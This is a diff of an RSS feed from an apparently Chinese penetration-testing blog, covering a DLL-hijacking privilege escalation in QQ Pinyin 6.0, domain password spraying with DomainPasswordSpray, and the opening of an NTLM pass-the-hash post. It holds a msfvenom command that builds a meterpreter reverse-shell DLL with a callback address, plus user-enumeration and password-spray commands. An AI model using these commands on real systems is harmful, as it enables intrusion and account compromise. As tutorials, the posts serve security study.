+获得会话后，注销（或重启）Guest用户，登录管理员用户，获得SYSTEM权限：&lt;/p&gt;</description></item><item><title>QQ拼音输入法6.0最新版DLL劫持 - 可利用于提权</title><link>https://payloads.online/archivers/2018-06-09/1/</link><pubDate>Sat, 09 Jun 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-06-09/1/</guid><description>&lt;h2 id="0x00-dll劫持简介"&gt;0x00 DLL劫持简介&lt;/h2&gt;
 &lt;p&gt;《DLL劫持》技术当一个可执行文件运行时，Windows加载器将可执行模块映射到进程的地址空间中，加载器分析可执行模块的输入表，并设法找出任何需要的DLL，并将它们映射到进程的地址空间中。 &amp;ndash; 百度百科&lt;/p&gt;
 &lt;h2 id="0x01-应用程序寻找dll的过程"&gt;0x01 应用程序寻找DLL的过程&lt;/h2&gt;
 &lt;ul&gt;
@@ -288,7 +314,10 @@ Ping命令都不让用，限制很死。&lt;/p&gt;
 &lt;h2 id="0x02-寻找过程"&gt;0x02 寻找过程&lt;/h2&gt;
 &lt;p&gt;Process Monitor一款系统进程监视软件，总体来说，Process Monitor相当于Filemon+Regmon，其中的Filemon专门用来监视系统 中的任何文件操作过程，而Regmon用来监视注册表的读写操作过程。 有了Process Monitor，使用者就可以对系统中的任何文件和 注册表操作同时进行监视和记录，通过注册表和文件读写的变化， 对于帮助诊断系统故障或是发现恶意软件、病毒或木马来说，非常 有用。 这是一个高级的 Windows 系统和应用程序监视工具，由优秀的 Sysinternals 开发，并且目前已并入微软旗下，可靠性自不用说。&lt;/p&gt;
 &lt;p&gt;通过Process Monitor找出一些可能容易被劫持的DLL，特征一般如下：&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://images.payloads.online/24a8fd52-4f5f-11ec-8285-00d861bf4abb.jpg" alt="0x01"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://images.payloads.online/24a8fd52-4f5f-11ec-8285-00d861bf4abb.jpg" data-fancybox="gallery" data-caption="0x01"&gt;
+ &lt;img src="https://images.payloads.online/24a8fd52-4f5f-11ec-8285-00d861bf4abb.jpg" alt="0x01" /&gt;
+&lt;/a&gt;
+&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;ntmarta.dll(直接调用)&lt;/li&gt;
 &lt;li&gt;profapi.dll（需要点击“配置”）&lt;/li&gt;
@@ -296,27 +325,28 @@ Ping命令都不让用，限制很死。&lt;/p&gt;
 &lt;p&gt;这两个都不在KnownDLLs中，由于开发人员调用这两个DLL的时候没有定义绝对路径，导致DLL搜索，我们可以直接在搜索到system32之前，放入我们要劫持的DLL。&lt;/p&gt;
 &lt;p&gt;权限问题：&lt;/p&gt;
 &lt;p&gt;如果要劫持的DLL目录被操作系统限制了必须以管理员权限才可以读写，那么我们无法利用，本文演示从低权限到高权限的DLL劫持提权。&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://images.payloads.online/24ed1d7a-4f5f-11ec-9f88-00d861bf4abb.jpg" alt="0x02"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://images.payloads.online/24ed1d7a-4f5f-11ec-9f88-00d861bf4abb.jpg" data-fancybox="gallery" data-caption="0x02"&gt;
+ &lt;img src="https://images.payloads.online/24ed1d7a-4f5f-11ec-9f88-00d861bf4abb.jpg" alt="0x02" /&gt;
+&lt;/a&gt;
+&lt;/p&gt;
 &lt;p&gt;那么这个漏洞刚刚好也符合我们的案例：C:\Program Files (x86)\Tencent\QQPinyin\6.0.5005.400&lt;/p&gt;
 &lt;p&gt;这个目录是任何人都可以读写的，使用MSF生成DLL：&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.211.55.19 LPORT=4478 -f dll &amp;gt; ntmarta.dll&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;接下来通过任意途径，将dll copy到&lt;code&gt;C:\Program Files (x86)\Tencent\QQPinyin\6.0.5005.400&lt;/code&gt;路径下即可&lt;/p&gt;
-&lt;p&gt;MSF配置如下：&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://images.payloads.online/25291a8c-4f5f-11ec-9430-00d861bf4abb.jpg" alt="0x03"&gt;&lt;/p&gt;
-&lt;p&gt;当用户使用输入法的时候、或者重启PC的时候，或者切换输入法的时候，都将会触发，我们可以获得一个Meterpreter会话。&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://images.payloads.online/256ca7ca-4f5f-11ec-89a6-00d861bf4abb.jpg" alt="0x04"&gt;&lt;/p&gt;
-&lt;h2 id="0x03-视频演示"&gt;0x03 视频演示&lt;/h2&gt;
-&lt;video src="https://images.payloads.online/25aa0304-4f5f-11ec-9da1-00d861bf4abb.mp4" controls="controls" width="500px"&gt;
-哎呀~ 换个浏览器试试吧！
-&lt;/video&gt;</description></item><item><title>Windows域渗透 - 用户密码枚举</title><link>https://payloads.online/archivers/2018-05-02/1/</link><pubDate>Wed, 02 May 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-05-02/1/</guid><description>&lt;h2 id="0x00-前言"&gt;0x00 前言&lt;/h2&gt;
+&lt;p&gt;接下来通过任意途径，将dll copy到&lt;code&gt;C:\Program Files (x86)\Tencent\QQPinyin\6.0.5005.400&lt;/code&gt;路径下即可&lt;/p&gt;</description></item><item><title>Windows域渗透 - 用户密码枚举</title><link>https://payloads.online/archivers/2018-05-02/1/</link><pubDate>Wed, 02 May 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-05-02/1/</guid><description>&lt;h2 id="0x00-前言"&gt;0x00 前言&lt;/h2&gt;
 &lt;p&gt;在进行Windows域渗透的时候，面对庞大的用户账号，不知该从何下手，扫描网络服务有怕搞出大动静，肿么办呢？&lt;/p&gt;
 &lt;h2 id="0x01-powershell"&gt;0x01 Powershell&lt;/h2&gt;
 &lt;p&gt;目前已经有很多Powershell集合脚本，用于域渗透简直舒爽&lt;/p&gt;
 &lt;p&gt;今天推荐一款名字叫&lt;code&gt;DomainPasswordSpray.ps1&lt;/code&gt;的脚本，主要原理是先来抓取域用户账号，然后指定密码字典进行域认证。认证通过的就是密码正确的了。&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://images.payloads.online/23ba8e1a-4f5f-11ec-bac7-00d861bf4abb.png" alt="0x00"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://images.payloads.online/23ba8e1a-4f5f-11ec-bac7-00d861bf4abb.png" data-fancybox="gallery" data-caption="0x00"&gt;
+ &lt;img src="https://images.payloads.online/23ba8e1a-4f5f-11ec-bac7-00d861bf4abb.png" alt="0x00" /&gt;
+&lt;/a&gt;
+&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;GitHub项目地址：https://github.com/dafthack/DomainPasswordSpray&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;由于作者的脚本有一个小瑕疵，故此我改了一下，避免抛出了一些错误。&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://images.payloads.online/23f92d78-4f5f-11ec-a331-00d861bf4abb.png" alt="0x01"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://images.payloads.online/23f92d78-4f5f-11ec-a331-00d861bf4abb.png" data-fancybox="gallery" data-caption="0x01"&gt;
+ &lt;img src="https://images.payloads.online/23f92d78-4f5f-11ec-a331-00d861bf4abb.png" alt="0x01" /&gt;
+&lt;/a&gt;
+&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;优化后的地址：http://payloads.online/scripts/Invoke-DomainPasswordSpray.txt&lt;/strong&gt;&lt;/p&gt;
 &lt;h2 id="0x02-参数说明"&gt;0x02 参数说明&lt;/h2&gt;
 &lt;p&gt;在代码的开头就已经有介绍了，我简单汉化一下。&lt;/p&gt;
@@ -337,9 +367,7 @@ Ping命令都不让用，限制很死。&lt;/p&gt;
 &lt;p&gt;该命令将从域中收集用户列表。&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;C:\PS&amp;gt; Get-DomainUserList -Domain 域名 -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii userlist.txt&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;该命令将收集域“域名”中的用户列表，包括任何未被禁用且未接近锁定状态的帐户。 它会将结果写入“userlist.txt”文件中&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;C:\PS&amp;gt; Invoke-DomainPasswordSpray -Password Winter2016&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;该命令将会从域环境中获取用户名，然后逐个以密码&lt;code&gt;Winter2016&lt;/code&gt;进行认证枚举&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;C:\PS&amp;gt; Invoke-DomainPasswordSpray -UserList users.txt -Domain 域名 -PasswordList passlist.txt -OutFile sprayed-creds.txt&lt;/code&gt;&lt;/p&gt;</description></item><item><title>使用CrackMapExec 进行 NTLM Hash传递攻击</title><link>https://payloads.online/archivers/2018-03-27/1/</link><pubDate>Tue, 27 Mar 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-03-27/1/</guid><description>&lt;h2 id="0x01-前言"&gt;0x01 前言&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;C:\PS&amp;gt; Invoke-DomainPasswordSpray -Password Winter2016&lt;/code&gt;&lt;/p&gt;</description></item><item><title>使用CrackMapExec 进行 NTLM Hash传递攻击</title><link>https://payloads.online/archivers/2018-03-27/1/</link><pubDate>Tue, 27 Mar 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-03-27/1/</guid><description>&lt;h2 id="0x01-前言"&gt;0x01 前言&lt;/h2&gt;
 &lt;p&gt;早期&lt;code&gt;SMB&lt;/code&gt;协议在网络上传输明文口令。后来出现 &lt;code&gt;LAN Manager Challenge/Response &lt;/code&gt;验证机制，简称&lt;code&gt;LM&lt;/code&gt;，它是如此简单以至很容易就被破解。微软提出了WindowsNT挑战/响应验证机制，称之为NTLM。&lt;/p&gt;
 &lt;p&gt;从&lt;code&gt;Win2000&lt;/code&gt;开始默认协议为&lt;code&gt;Kerboros&lt;/code&gt;，下列情况会调用&lt;code&gt;NTLM&lt;/code&gt;：&lt;/p&gt;
 &lt;ul&gt;
